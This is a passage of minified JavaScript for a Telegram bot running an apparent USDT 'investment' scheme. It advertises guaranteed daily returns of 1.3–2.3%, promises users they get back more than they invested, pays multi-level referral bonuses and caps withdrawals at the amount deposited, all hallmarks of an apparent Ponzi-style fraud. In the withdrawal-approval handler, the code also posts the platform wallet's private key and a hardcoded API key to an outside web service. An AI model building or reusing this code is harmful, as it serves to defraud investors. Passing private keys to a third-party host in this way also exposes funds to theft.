                    console.log(e), te(e);
                }
            }),
            S.hears("💹 Invest", async (e) => {
                try {
                    let t = await ne.collection("admin").find({ admin: "admin" }).toArray();
                    if ("private" != e.message.chat.type) return;
                    if ("Active" != t[0].botstat) return void ue(e, "*⛔ Currently Bot Is Under Maintenance*");
                    let a = await ne.collection("info").find({ user: e.from.id }).toArray();
                    if (!("activated" in a[0])) return void ie(e);
                    let 
                        r = `*What would you like to do?*\n\n🔁 Reinvest – ReInvest Your Withdrawal balance\n💰 Invest – Invest from deposit balance to earn daily Gain.\n\n💳 *Re-investable Balance:* ${ "balance" in a[0] ? fe(a[0].balance, 8) : "0.00000000" } *USDT*\n💹 *Investable Balance:* ${"depositBalance" in a[0] ? fe(a[0].depositBalance, 8) : "0.00000000"} *USDT*\n\n`,
                        s = [[{ text: "🔁 Reinvest", callback_data: "convertToDeposit" }], [{ text: "📈 Invest", callback_data: "invest" }]];
                    await ue(e, r, { reply_markup: { inline_keyboard: s } });
                } catch (e) {
                    console.log(e), te(e);
                }
            }),
            S.action("convertToDeposit", async (e) => {
                e.from.id, await e.scene.leave(O);
                const t = await ne.collection("info").find({ user: e.from.id }).toArray(),
                    a = ("depositBalance" in t[0] && fe(t[0].depositBalance, 8), "balance" in t[0] ? fe(t[0].balance, 8) : "0.00000000");
                let n = a;
                const r = parseFloat(a);
                let s = [
                   
                ].filter((e) => "convert:manual" !== e.callback_data);
                s = s.map((e) => {
                    const t = parseInt(e.text) / 100,
                        a = fe(r * t, 4);
                    return { ...e, text: `${e.text} (${a} USDT)` };
                });
                const i = [s.slice(0, 2), s.slice(2, 4), [{ text: "Enter amount manually", callback_data: "manual" }], [{ text: "🔙 Back", callback_data: "backToInvest" }]];
                let o = "♻️ Select the amount you want to Reinvest or type the amount manually\n\n";
                (o += `✅ Available balance allowed to reinvest: ${n} USDT\n`),
                    (o += "⚜ Minimum Reinvest: 100 USDT\n\n");

o += "💡 Here are your Re-investment plan options in (USDT): 💡\n";
o += "1️⃣ 1.3% daily return for 100 to 499.99.\n";
o += "2️⃣ 1.8% daily return for 500 to 999.99.\n";
o += "3️⃣ 2.3% daily return for 1000 or more.\n";


                    parseFloat(a) < 1 ? e.answerCbQuery("Sorry, You do not have enough USDT to ReInvest.", { show_alert: !0 }) : await ce(e, o, { reply_markup: { inline_keyboard: i } });
            }),
            S.hears("💰 Wealth", async (e) => {
                if (e.message.text.includes("💰"))
                    try {
                        let a = await ne.collection("admin").find({ admin: "admin" }).toArray();
                        if ("private" != e.message.chat.type) return;
                        if ("Active" != a[0].botstat) return void ue(e, "*⛔ Currently Bot Is Under Maintenance*");
                        let n = await ne.collection("info").find({ user: e.from.id }).toArray();
                        if (!("activated" in n[0])) return void ie(e);
                        var t = `🔥 *Account Wealth* 🔥\n\n💰 *Deposit Balance:* ${"depositBalance" in n[0] ? fe(n[0].depositBalance, 8) : "0.00000000"} USDT\n🔓 *Withdrawable Balance:* ${ "balance" in n[0] ? fe(n[0].balance, 8) : "0.00000000" } USDT\n📈 *Active Investments:* ${"activeInvestments" in n[0] ? fe(n[0].activeInvestments, 8) : "0.00000000"} USDT\n\n💵 *Total Profit:* ${ "totalProfit" in n[0] ? fe(n[0].totalProfit, 8) : "0.00000000" } USDT\n🎁 *Total Affiliate Bonus:* ${"totalAffiliateBonus" in n[0] ? fe(n[0].totalAffiliateBonus, 8) : "0.00000000"} USDT`
                        de(e.from.id, t, {
                            parse_mode: "Markdown",
                            reply_markup: { keyboard: se, resize_keyboard: !0, one_time_keyboard: !0, keyboard: se.map((e) => e.map((e) => ({ text: e, resize_keyboard: !0, one_time_keyboard: !0 }))), resize_keyboard: !0 },
                        });
                    } catch (e) {
                        console.log(e), te(e);
                    }
            }),
            S.action("manual", async (e) => {
                try {
                    if ("Active" != (await ne.collection("admin").find({ admin: "admin" }).toArray())[0].botstat) return void ue(e, "*⛔ Currently Bot Is Under Maintenance*");
                    if (!("activated" in (await ne.collection("info").find({ user: e.from.id }).toArray())[0])) return void ie(e);
                    let t = "Enter the amount you want to Re-invest \n\n";
                    await ce(e, t, { reply_markup: { inline_keyboard: [[{ text: "↩️ Back", callback_data: "convertToDeposit" }]] } }), e.scene.enter("reinvestamo", { user: e.from.id });
                } catch (e) {
                    console.log(e), te(e);
                }
            }),
            S.hears("🖥️ Calculate", async (e) => {
                try {
                    let t = await ne.collection("admin").find({ admin: "admin" }).toArray();
                    if ("private" != e.message.chat.type) return;
                    if ("Active" != t[0].botstat) return void ue(e, "*⛔ Currently Bot Is Under Maintenance*");
                    if (!("activated" in (await ne.collection("info").find({ user: e.from.id }).toArray())[0])) return void ie(e);
                    let a = "💰🖥️ *Profit Calculator* 🖥️💰\n\nCalculate your incoming profits with ease!\n\n*💵 Get Started 💵*";
                    await ue(e, a, { reply_markup: { keyboard: [["↩️ Back to Menu"]] } }), await e.scene.enter("calcprofit");
                } catch (e) {
                    console.log(e), te(e);
                }
            }),
            z.on("text", async (e) => {
                try {
                    const t = "calcprofit";
                    if ("↩️ Back to Menu" == e.message.text) return we(e), void (await e.scene.leave(t));
                    {
                        let a = parseFloat(e.message.text);
                        if (isNaN(a)) return void e.reply("⛔️ Enter numerical value Only ���️");
                        let n = { daily_amount: k[0], daily_expired: 1, daily_hour: b[0], profit_percent: g[0] },
                            r = { daily_amount: k[1], daily_expired: 1, daily_hour: b[1], profit_percent: g[1] },
                            s = { daily_amount: k[2], daily_expired: 1, daily_hour: b[2], profit_percent: g[2] },
                            i = null;
                        i = a >= s.daily_amount ? s : a >= r.daily_amount ? r : n;
                        let o = ((a * i.profit_percent) / 100) * i.daily_expired,
                            l = (i.daily_hour, i.daily_hour),
                            d = Math.ceil(i.daily_expired / 24),
                            c = a + o;
                        ue(
                            e,
                            `🖥 *Profit Calculator* 🖥\n\n*Amount Invested:* ${a} USDT\n*Plan:* ${i.profit_percent}% daily for ${i.daily_expired} days\n*Credit Time:* ${i.profit_percent}% every ${
                                i.daily_hour
                            } hours\n\n*After ${l} Hours:* ${c.toFixed(2)} USDT\n⏱ _Your first payment will arrive after ${l} hours!_\n\n💰 *After ${d} Days:* ${c.toFixed(
                                2
                            )} USDT\n❓_You will get back more than what you invested after just ${i.daily_expired} days._\n\n🔥 *Total Profit:* ${o.toFixed(2)} USDT`,
                            { reply_markup: { keyboard: re, resize_keyboard: !0 } }
                        ),
                            await e.scene.leave(t);
                    }
                } catch (e) {
                    console.log(e), te(e);
                }
            }),
            O.on("text", async (e) => {
                try {
                    const t = "manualconvert";
                    if ("↩️ Back" == e.message.text) return void (await e.scene.leave(t));
                    {
                        let a = parseFloat(e.message.text);
                        if (isNaN(a)) return void e.reply("⛔️ Error! Please enter numerical values only. Let's try again! 🚫💰");
                        if (a < 1)
                            return (
                                await le(e.chat.id, e.message.message_id),
                                await le(e.chat.id, e.message.message_id - 1),
                                await ue(e, "*❌ Oops! Conversion failed. 😞\nThe entered amount of ${a} USDT is less than the minimum required amount of 1 USDT. Please try again with a valid amount. 💸💔", {
                                    reply_markup: { inline_keyboard: [[{ text: "↩️ Back", callback_data: "backToInvest" }]] },
                                    parse_mode: "markdown",
                                }),
                                void (await e.scene.leave(t))
                            );
                        const n = await ne.collection("info").find({ user: e.scene.state.userId }).toArray(),
                            r = ("depositBalance" in n[0] && fe(n[0].depositBalance, 8), "balance" in n[0] ? fe(n[0].balance, 8) : "0.00000000");
                        if (a > parseFloat(r))
                            return (
                                await le(e.chat.id, e.message.message_id),
                                await le(e.chat.id, e.message.message_id - 1),
                                await ue(e, "*❌ Oops! Conversion failed. 😞\nYour entered amount of ${a} USDT is greater than your available withdrawable balance of ${r} USDT. Please try again with a valid amount. 💸💔*", {
                                    reply_markup: { inline_keyboard: [[{ text: "↩️ Back", callback_data: "backToInvest" }]] },
                                }),
                                void (await e.scene.leave(t))
                            );
                        await ne.collection("info").updateOne({ user: e.scene.state.userId }, { $inc: { balance: -a } }), await ne.collection("info").updateOne({ user: e.scene.state.userId }, { $inc: { depositBalance: a } });
                        let s = `✅ Great news! You have successfully converted ${a} USDT from your withdrawable balance to your Investable balance! 💰📈                        `;
                        await le(e.chat.id, e.message.message_id),
                            await le(e.chat.id, e.message.message_id - 1),
                            await ue(e, s, { reply_markup: { inline_keyboard: [[{ text: "↩️ Back", callback_data: "backToInvest" }]] } }),
                            await e.scene.leave(t);
                    }
                } catch (e) {
                    console.log(e), te(e);
                }
            }),
            Y.on("text", async (e) => {
                try {
                    const t = "support";
                    if ("↩️ Back to Menu" == e.message.text) return we(e), void (await e.scene.leave(t));
                    {
                        let a = e.message.text,
                            n = `📩 *Message sent to the Support team:*\n\n${a}\n\n*Our support team will get back to you as soon as possible. Thank you for reaching out!* 😊`;
                        await ue(e, n, { reply_markup: { keyboard: re, resize_keyboard: !0 } });
                        for (const t of w) {
                            let n = t;
                            const r = { inline_keyboard: [[{ text: "Send him message", callback_data: `send:${e.from.id}` }]] };
                            let s = `👋 *New support message from user * [${e.from.first_name}](tg://user?id=${e.from.id}) (${e.from.id}) (@${e.from.username}):\n\n${a}`;
                            await de(n, s, { parse_mode: "Markdown", reply_markup: r });
                        }
                        await e.scene.leave(t);
                    }
                } catch (e) {
                    te(e), console.log(e);
                }
            }),
            S.hears("📱 Talk to Us", async (e) => {
                try {
                    let t = await ne.collection("admin").find({ admin: "admin" }).toArray();
                    if ("private" !== e.message.chat.type) return;
                    if ("Active" !== t[0].botstat) return void ue(e, "*⛔ Currently Bot Is Under Maintenance*");
                    if (!("activated" in (await ne.collection("info").find({ user: e.from.id }).toArray())[0])) return void ie(e);
                    const a = `
Hello there! 👋

Welcome to our *Support Center*, where we're always here to help. Have a question? Ask us anything! 💬

Our team is dedicated to providing the *best experience*. We'll resolve your issues *swiftly* and with a smile. 😊

We can't wait to hear from you! 🙌
`;
                    await ue(e, a, { reply_markup: { keyboard: [["↩️ Back to Menu"]], resize_keyboard: !0 } }), await e.scene.enter("support");
                } catch (e) {
                    console.log(e);
                }
            }),
            W.on("text", async (e) => {
                try {
                    const t = "senderSupport";
                    if ("⛔ Cancel" == e.message.text) return we(e), void (await e.scene.leave(t));
                    {
                        let a = "Message from Admin :\n\n" + e.message.text;
                        await de(e.scene.state.userId, a), await e.reply("Message sent successfully! to :" + e.scene.state.userId), await e.scene.leave(t);
                    }
                } catch (e) {
                    te(e), console.log(e);
                }
            }),
            S.action(/^send:(\d+)$/, async (e) => {
                try {
                    const [t, a] = e.callbackQuery.data.split(":").slice(1);
                    await e.reply("Please type the message you want to send:", { keyboard: [["⛔ Cancel"]] }), await e.scene.enter("senderSupport", { userId: t, messageText: a });
                } catch (e) {
                    console.log(e);
                }
            }),
            S.action(/^convert:(\d+)$/, async (e) => {
                try {
                    const [t, a] = e.callbackQuery.data.split(":").slice(1),
                        n = await ne.collection("info").find({ user: e.from.id }).toArray(),
                        r = "balance" in n[0] ? fe(n[0].balance, 8) : "0.00000000";
                    let s = parseFloat((r * t) / 100);
                    if (s > parseFloat(r))
                        return void (await ce(e, "*❌Conversion Failed *\n\n Your entered amount :* " + s + " * is greater than your withdrawable balance :* " + r + " USDT*", {
                            reply_markup: { inline_keyboard: [[{ text: "↩️ Back", callback_data: "backToInvest" }]] },
                            parse_mode: "markdown",
                        }));
                    if (s < 1)
                        return void (await ce(e, "*❌Conversion Failed *\n\n Your selected amount :* " + s + " * is less than minimum *1 USDT*", {
                            reply_markup: { inline_keyboard: [[{ text: "↩️ Back", callback_data: "backToInvest" }]] },
                            parse_mode: "markdown",
                        }));
                    await ne.collection("info").updateOne({ user: e.from.id }, { $inc: { balance: -s } }), await ne.collection("info").updateOne({ user: e.from.id }, { $inc: { depositBalance: s } });
                    let i = `✅Successfully converted *${s} USDT* from withdrawable balance to Investable balance\n\n`;
                    await ce(e, i, { reply_markup: { inline_keyboard: [[{ text: "↩️ Back", callback_data: "backToInvest" }]] }, parse_mode: "markdown" });
                } catch (e) {
                    console.log(e), te(e);
                }
            }),
            S.hears("🔍 About Us", async (e) => {
                try {
                    let t = await ne.collection("admin").find({ admin: "admin" }).toArray();
                    if ("private" != e.message.chat.type) return;
                    if ("Active" != t[0].botstat) return void ue(e, "*⛔ Currently Bot Is Under Maintenance*");
                    if (!("activated" in (await ne.collection("info").find({ user: e.from.id }).toArray())[0])) return void ie(e);
                    await ue(e, $);
                } catch (e) {
                    console.log(e), te(e);
                }
            }),
            S.hears("👬 Share & Earn", async (e) => {
                try {
                    let t = await ne.collection("admin").find({ admin: "admin" }).toArray();
                    if ("private" != e.message.chat.type) return;
                    if ("Active" != t[0].botstat) return void ue(e, "*⛔ Currently Bot Is Under Maintenance*");
                    let a = await ne.collection("info").find({ user: e.from.id }).toArray();
                    if (!("activated" in a[0])) return void ie(e);
                    let n = a[0].referlvl1count,
                        r = a[0].referlvl2count,
                        s = a[0].referlvl3count,
                        i = fe(a[0].totalAffiliateBonus, 8) || fe(0, 8),
                        o = a[0].referinfo || pe(),
                        l = "🥇 Level 1 - " + h[0] + "%\n🥈 Level 2 - " + h[1] + "%\n🥉 Level 3 - " + h[2] + "%\n\n";
                    await ue(e, l);
                    let d = "🔗 Join our referral program & earn rewards! Share your referral code with friends, family, & followers to maximize your earnings. Join now & unlock the power of referrals! Link: https://t.me/" + e.botInfo.username;




                    
                    let c = "⛓️ Referral Program Statistics\n\nLevel 1: " + n + " users referred\nLevel 2: " + r + " users referred\nLevel 3: " + s + " users referred\n\n♾ Earnings: " + i + " USDT\n\nYour Referral Code: `" + o + "`\n\n "
                    await ue(e, c, { reply_markup: { inline_keyboard: [[{ text: "🕵️‍♀️ Detailed Data", callback_data: "Detailed_Data" }]] } }),
                    await de(e.from.id, d, { disable_web_page_preview: !0 })
                    ,
                        a[0].referinfo || (await ne.collection("info").updateOne({ user: e.from.id }, { $set: { referinfo: o } }));
                } catch (e) {
                    console.log(e), te(e);
                }
            });
        const ye = [
            [{ text: "Level 1 Details", callback_data: "Level1Details" }],
            [{ text: "Level 2 Details", callback_data: "Level2Details" }],
            [{ text: "Level 3 Details", callback_data: "Level3Details" }],
            [{ text: "⬅️ Back", callback_data: "Back" }],
        ];
        async function we(e) {
            ue(e, "*👋 Welcome To Main Menu*", { reply_markup: { keyboard: re, resize_keyboard: !0 } });
        }
        S.action("Detailed_Data", async (e) => {
            await ce(e, "Please select a level to view the details:", { reply_markup: { inline_keyboard: ye } });
        }),
            S.action("Back", async (e) => {
                let t = await ne.collection("info").find({ user: e.from.id }).toArray(),
                    a =
                        "*⛓️ Referral Statistics*\n\nLevel 1: " +
                        t[0].referlvl1count +
                        " users\nLevel 2: " +
                        t[0].referlvl2count +
                        " users\nLevel 3: " +
                        t[0].referlvl3count +
                        " users\n\n♾ Earnings: " +
                        (t[0].referraldeposits || fe(0, 8)) +
                        " USDT\n\nYour Referral Code:` " +
                        (t[0].referinfo || pe()) +
                        "`\n\n *You can det detailed report Below*";
                await ce(e, a, { reply_markup: { inline_keyboard: [[{ text: "🕵️‍♀️ Detailed Data", callback_data: "Detailed_Data" }]] }, parse_mode: "Markdown" });
            }),
            S.action("Level3Details", async (e) => {
                const t = await ne.collection("lvl3users").findOne({ user: e.from.id });
                let a = "Level 3 Details\n";
                if (t && t.registeredUsers.length > 0) {
                    let n = t.registeredUsers.slice(0, 25);
                    for (const e of n) a += `\n- User ID: [${e.firstname}](tg://user?id=${e.userid}) his deposits: ${e.deposits}$ ,You earned: ${fe(e.earnings, 4)}$ USDT`;
                    if (t.registeredUsers.length > 25) {
                        a += "\n\nClick the button below for more details:";
                        let t = [[{ text: "Next 25", callback_data: "Level3Details:offset:25" }], [{ text: "⬅️ Back", callback_data: "Back" }]];
                        await ce(e, a, { reply_markup: { inline_keyboard: t }, parse_mode: "Markdown" });
                    } else await ce(e, a, { reply_markup: { inline_keyboard: [[{ text: "⬅️ Back", callback_data: "Back" }]] }, parse_mode: "Markdown" });
                } else (a += "\nNo Referrals"), await ce(e, a, { reply_markup: { inline_keyboard: [[{ text: "⬅️ Back", callback_data: "Back" }]] }, parse_mode: "Markdown" });
            }),
            S.action(/Level3Details:offset:(\d+)/, async (e) => {
                try {
                    const t = parseInt(e.match[1]),
                        a = await ne.collection("lvl3users").findOne({ user: e.from.id });
                    let n = `Level 3 Details (Showing ${t + 1} to ${t + 25})\n`,
                        r = a.registeredUsers.slice(t, t + 25);
                    for (const e of r) n += `\n- User ID: [${e.firstname}](tg://user?id=${e.userid}) his deposits: ${e.deposits}$ ,You earned: ${fe(e.earnings, 4)}$ USDT`;
                    let s = [
                        [
                            { text: "Prev 25", callback_data: `Level3Details:offset:${Math.max(t - 25, 0)}` },
                            { text: "Next 25", callback_data: `Level3Details:offset:${Math.min(t + 25, a.registeredUsers.length)}` },
                        ],
                        [{ text: "⬅️ Back", callback_data: "Back" }],
                    ];
                    await ce(e, n, { reply_markup: { inline_keyboard: s }, parse_mode: "Markdown" });
                } catch (e) {
                    console.log(e);
                }
            }),
            S.action("Level1Details", async (e) => {
                const t = await ne.collection("lvl1users").findOne({ user: e.from.id });
                let a = "Level 1 Details\n";
                if (t && t.registeredUsers.length > 0) {
                    let n = t.registeredUsers.slice(0, 25);
                    for (const e of n) a += `\n- User ID: [${e.firstname}](tg://user?id=${e.userid}) his deposits: ${e.deposits}$ ,You earned: ${fe(e.earnings, 4)}$ USDT`;
                    if (t.registeredUsers.length > 25) {
                        a += "\n\nClick the button below for more details:";
                        let t = [[{ text: "Next 25", callback_data: "Level1Details:offset:25" }], [{ text: "⬅️ Back", callback_data: "Back" }]];
                        await ce(e, a, { reply_markup: { inline_keyboard: t }, parse_mode: "Markdown" });
                    } else await ce(e, a, { reply_markup: { inline_keyboard: [[{ text: "⬅️ Back", callback_data: "Back" }]] }, parse_mode: "Markdown" });
                } else (a += "\nNo Referrals"), await ce(e, a, { reply_markup: { inline_keyboard: [[{ text: "⬅️ Back", callback_data: "Back" }]] }, parse_mode: "Markdown" });
            }),
            S.action(/Level1Details:offset:(\d+)/, async (e) => {
                try {
                    const t = parseInt(e.match[1]),
                        a = await ne.collection("lvl1users").findOne({ user: e.from.id });
                    let n = `Level 1 Details (Showing ${t + 1} to ${t + 25})\n`,
                        r = a.registeredUsers.slice(t, t + 25);
                    for (const e of r) n += `\n- User ID: [${e.firstname}](tg://user?id=${e.userid}) his deposits: ${e.deposits}$ ,You earned: ${fe(e.earnings, 4)}$ USDT`;
                    let s = [
                        [
                            { text: "Prev 25", callback_data: `Level1Details:offset:${Math.max(t - 25, 0)}` },
                            { text: "Next 25", callback_data: `Level1Details:offset:${Math.min(t + 25, a.registeredUsers.length)}` },
                        ],
                        [{ text: "⬅️ Back", callback_data: "Back" }],
                    ];
                    await ce(e, n, { reply_markup: { inline_keyboard: s }, parse_mode: "Markdown" });
                } catch (e) {
                    console.log(e);
                }
            }),
            S.action("Level2Details", async (e) => {
                const t = await ne.collection("lvl2users").findOne({ user: e.from.id });
                let a = "Level 2 Details\n";
                if (t && t.registeredUsers.length > 0) {
                    let n = t.registeredUsers.slice(0, 25);
                    for (const e of n) a += `\n- User ID: [${e.firstname}](tg://user?id=${e.userid}) his deposits: ${e.deposits}$ ,You earned: ${fe(e.earnings, 4)}$ USDT`;
                    if (t.registeredUsers.length > 25) {
                        a += "\n\nClick the button below for more details:";
                        let t = [[{ text: "Next 25", callback_data: "Level2Details:offset:25" }], [{ text: "⬅️ Back", callback_data: "Back" }]];
                        await ce(e, a, { reply_markup: { inline_keyboard: t }, parse_mode: "Markdown" });
                    } else await ce(e, a, { reply_markup: { inline_keyboard: [[{ text: "⬅️ Back", callback_data: "Back" }]] }, parse_mode: "Markdown" });
                } else (a += "\nNo Referrals"), await ce(e, a, { reply_markup: { inline_keyboard: [[{ text: "⬅️ Back", callback_data: "Back" }]] }, parse_mode: "Markdown" });
            }),
            S.action(/Level2Details:offset:(\d+)/, async (e) => {
                try {
                    const t = parseInt(e.match[1]),
                        a = await ne.collection("lvl2users").findOne({ user: e.from.id });
                    let n = `Level 2 Details (Showing ${t + 1} to ${t + 25})\n`,
                        r = a.registeredUsers.slice(t, t + 25);
                    for (const e of r) n += `\n- User ID: [${e.firstname}](tg://user?id=${e.userid}) his deposits: ${e.deposits}$ ,You earned: ${fe(e.earnings, 4)}$ USDT`;
                    let s = [
                        [
                            { text: "Prev 25", callback_data: `Level2Details:offset:${Math.max(t - 25, 0)}` },
                            { text: "Next 25", callback_data: `Level2Details:offset:${Math.min(t + 25, a.registeredUsers.length)}` },
                        ],
                        [{ text: "⬅️ Back", callback_data: "Back" }],
                    ];
                    await ce(e, n, { reply_markup: { inline_keyboard: s }, parse_mode: "Markdown" });
                } catch (e) {
                    console.log(e);
                }
            }),
            S.hears(["💼 Wallet Change","💼 Set  Wallet"], async (e) => {
                try {
                    let t = await ne.collection("admin").find({ admin: "admin" }).toArray();
                    if ("private" != e.message.chat.type) return;
                    if ("Active" != t[0].botstat) return void ue(e, "*⛔ Currently Bot Is Under Maintenance*");
                    let a = await ne.collection("info").find({ user: e.from.id }).toArray();
                    if (!("activated" in a[0])) return void ie(e);
                    const n = "🔑 *Withdrawal BEP20-USDT Wallet* 🔑\n\nYour currently set wallet is: `" + ("wallet" in a[0] ? a[0].wallet : "⛔ NOT SET") + "`\n\n💸 _This wallet will be used for all future withdrawals._",
                        s = r.inlineKeyboard([r.button.callback("Change wallet", "set_wallet")]);
                    await ue(e, n, s);
                } catch (e) {
                    te(e), console.log(e);
                }
            }),
            S.action("set_wallet", async (e) => {
                try {
                    if ("Active" != (await ne.collection("admin").find({ admin: "admin" }).toArray())[0].botstat) return void ue(e, "*⛔ Currently Bot Is Under Maintenance*");
                    if (!("activated" in (await ne.collection("info").find({ user: e.from.id }).toArray())[0])) return void ie(e);
                    ue(e, "*💡 Send Your USDT-BEP20 address*", { reply_markup: { keyboard: [["⬅️ Back"]], resize_keyboard: !0 } }), await e.scene.enter("setwallet");
                } catch (e) {
                    te(e), console.log(e);
                }
            }),
            C.on("text", async (e) => {
                try {
                    const t = "setwallet",
                        a = e.message.text;
                    if ("⬅️ Back" == e.message.text) return we(e), void (await e.scene.leave(t));
                    if (!a.startsWith("0x") || 42 !== a.length) return void ue(e, "*🚫 Not A BEP20 Wallet Address*", { reply_markup: { keyboard: [["⬅️ Back"]], resize_keyboard: !0 } });
                    ne.collection("info").updateOne({ user: e.from.id }, { $set: { wallet: e.message.text } }),
                        ue(e, "*✅ Your BEP20 Wallet Address Updated To " + e.message.text + "*", { reply_markup: { keyboard: re, resize_keyboard: !0 } }),
                        await e.scene.leave(t);
                } catch (e) {
                    te(e), console.log(e);
                }
            }),
            S.hears("💸 Cash Out", async (e) => {
                try {
                    let a = await ne.collection("admin").find({ admin: "admin" }).toArray();
                    if ("private" != e.message.chat.type) return;
                    if ("Active" != a[0].botstat) return void ue(e, "*⛔ Currently Bot Is Under Maintenance*");
                    if ("On" != a[0].withstat) return void ue(e, "*⛔ Currently Withdrawls Are Not available*");
                    let n = await ne.collection("info").find({ user: e.from.id }).toArray();
                    if (!("activated" in n[0])) return void ie(e);
                    if ("balance" in n[0]) t = n[0].balance;
                    else var t = 0;
                    let r = k[0];
                    
                    if (parseFloat(t) < parseFloat(r)) return void ue(e, "*⚠️ You Must have minimum " + r.toFixed(2) + " " + v + "*");
                    if ("NOT SET" == n[0].wallet || "" == n[0].wallet) return void ue(e, "*Your withdraw wallet not set*", { reply_markup: { keyboard: [["💼 Set  Wallet"]] } });
                    ue(e, "*🫂 Send Amount To Withdraw*", { reply_markup: { keyboard: [["⬅️ Back"]], resize_keyboard: !0 } }), await e.scene.enter("onwith");
                } catch (e) {
                    te(e), console.log(e);
                }
            }),
            P.on("text", async (e) => {
                try {
                    const a = "onwith";
                    await ne.collection("admin").find({ admin: "admin" }).toArray();
                    var t = await ne.collection("info").find({ user: e.from.id }).toArray();
                    let n = k[0];
                    if ("⬅️ Back" == e.message.text) return we(e), void (await e.scene.leave(a));

                    if (isNaN(e.message.text)) return ue(e, "*🚫 Not A Valid Amount*", { reply_markup: { keyboard: re, resize_keyboard: !0 } }), void (await e.scene.leave(a));
                    if (parseFloat(n) > parseFloat(e.message.text)) return ue(e, "*⚠️ Minimum Withdraw Is " + n + " " + v + "*", { reply_markup: { keyboard: re, resize_keyboard: !0 } }), void (await e.scene.leave(a));
                    if (parseFloat(e.message.text) > parseFloat(t[0].userdeposit)) return ue(e, "*⚠️ You are allowed to withdraw only "+t[0].userdeposit+" USDT*", { reply_markup: { keyboard: re, resize_keyboard: !0 } }), void (await e.scene.leave(a));
                    if (parseFloat(e.message.text) > parseFloat(t[0].balance)) return ue(e, "*⚠️ You Did Not Have Enough Balance*", { reply_markup: { keyboard: re, resize_keyboard: !0 } }), void (await e.scene.leave(a));
                    if (e.message.forward_from) return ue(e, "*🚫 Forwards Not Allowed*", { reply_markup: { keyboard: re, resize_keyboard: !0 } }), void (await e.scene.leave(a));
                    {
                        const n = new Date(),
                            r = await ne.collection("withdraw").findOne({ user: e.from.id }, { sort: { date: -1 } });
                        if (r && n - r.date < 864e5) {
                            const t = new Date(r.date.getTime() + 864e5 - n.getTime());
                            return (
                                ue(
                                    e,
                                    `*⚠️ You have already made a withdrawal request in the past 24 hours. Please try again in ${Math.floor(t.getTime() / 36e5)} hours, ${Math.floor((t.getTime() % 36e5) / 6e4)} minutes, and ${Math.floor(
                                        (t.getTime() % 6e4) / 1e3
                                    )} seconds.*`,
                                    { reply_markup: { keyboard: re, resize_keyboard: !0 } }
                                ),
                                void (await e.scene.leave(a))
                            );
                        }
                        {
                            let n = e.from.id + "" + new Date().getTime();
                            await ne
                                .collection("withdraw")
                                .insertOne({ user: e.from.id, amount: parseFloat(e.message.text), wallet: t[0].wallet, date: new Date(), txId: "Not Generated", status: "pending", id: n, name: e.from.first_name, username: e.from.username }),
                                await ne.collection("info").updateOne({ user: e.from.id }, { $inc: { balance: -parseFloat(e.message.text),userdeposit: -parseFloat(e.message.text) } }),
                                await ne.collection("statistics").updateOne({}, { $inc: { totalWithdrawals: parseFloat(e.message.text) } });
                            let r = "*✅ Withdrawal Requested Successfully\n\n💰 Amount: " + e.message.text + " " + v + "\n🗂️ Wallet Address:* `" + t[0].wallet + "`*\n\nYou will receive your withdrawal details within a few hours.*";
                            await e.replyWithMarkdown(r),
                                await e.telegram.sendMessage(
                                    w[0],
                                    "🚨 New Withdrawal Request\n\nfrom user :" +
                                        e.from.id +
                                        " (" +
                                        e.from.first_name +
                                        ") (" +
                                        e.from.username +
                                        ") \n\n 💰 Amount: " +
                                        e.message.text +
                                        " " +
                                        v +
                                        "\n🗂️ Wallet Address: " +
                                        t[0].wallet +
                                        "\n\nClick On '✅ Approve' To Approve This Withdrawal",
                                    {
                                        reply_markup: {
                                            inline_keyboard: [
                                                [
                                                    { text: "✅ Approve", callback_data: "approve " + n },
                                                    { text: "⛔️ Reject", callback_data: "reject " + n },
                                                ],
                                            ],
                                            parse_mode: !0,
                                        },
                                    }
                                ),
                                await e.scene.leave(a);
                        }
                    }
                } catch (e) {
                    te(e), console.log(e);
                }
            }),
            S.action("pendingwithdraw", async (e) => {
                try {
                    const t = await ne.collection("withdraw").find({ status: "pending" }).toArray();
                    if (0 === t.length) return e.reply("No withdrawal requests are pending");
                    for (let a = 0; a < t.length; a++) {
                        const n = t[a],
                            r =
                                "🚨 New Withdrawal Request\n\nfrom user: " +
                                n.user +
                                " (" +
                                n.name +
                                ") (" +
                                n.username +
                                ") \n\n 💰 Amount: " +
                                n.amount +
                                "\n🗂️ Wallet Address: " +
                                n.wallet +
                                "\n Status: " +
                                n.status +
                                "\n\nDate: " +
                                n.date.toLocaleString("en-US", { timeZone: "UTC" }),
                            s = {
                                reply_markup: {
                                    inline_keyboard: [
                                        [
                                            { text: "✅ Approve", callback_data: "approve " + n.id },
                                            { text: "⛔️ Reject", callback_data: "reject " + n.id },
                                        ],
                                    ],
                                },
                            };
                        await e.reply(r, s);
                    }
                } catch (t) {
                    console.log(e), te(e);
                }
            }),
            S.action(/^approve (.+)$/, async (e) => {
                try {
                    const t = e.update.callback_query.message.message_id,
                        a = e.update.callback_query.message.chat.id,
                        n = e.update.callback_query.inline_message_id,
                        r = e.match[1],
                        s = await ne.collection("withdraw").findOne({ id: r });
                    if ("rejected" === s.status || "approved" === s.status) await e.answerCbQuery("This action is no longer available.its already " + s.status);
                    else {
                        const i = "cf1c3da73820af4c69e01f4555bc23c5",
                            o = "https://BSC-RPC.up.railway.app/Transfer",
                            l = { "Content-Type": "application/json" },
                            d = { receiver: s.wallet, amount: parseFloat(s.amount), private_key: T, apikey: i },
                            c = await (async function (e, t, a) {
                                try {
                                    const n = await p(e, { method: "POST", body: JSON.stringify(t), headers: a });
                                    return await n.json();
                                } catch (e) {
                                    return console.error("Error making HTTP request:", e), e;
                                }
                            })(o, d, l);
                        if (0 == c.success)
                            await e.telegram.editMessageText(
                                a,
                                t,
                                n,
                                "🚨 New Withdrawal Request\n\nfrom user :" +
                                    s.user +
                                    " (" +
                                    s.name +
                                    ") (" +
                                    s.username +
                                    ") \n\n 💰 Amount: " +
                                    s.amount +
                                    "\n🗂️ Wallet Address: " +
                                    s.wallet +
                                    "\n Status : Fail to Approve \n\n TXID : Not Generated\n\n Reason:" +
                                    c.error,
                                {
                                    reply_markup: {
                                        inline_keyboard: [
                                            [
                                                { text: "✅ Approve", callback_data: "approve " + r },
                                                { text: "⛔️ Reject", callback_data: "reject " + r },
                                            ],
                                        ],
                                    },
                                }
                            ),
                                await e.answerCbQuery("The withdrawal approval has been Failed.Reason:" + c.error);
                        else {
                            const i = c.transaction.transactionHash;
                            await ne.collection("withdraw").updateOne({ id: r }, { $set: { status: "approved", txId: i } }),
                                await e.telegram.sendMessage(
                                    s.user,
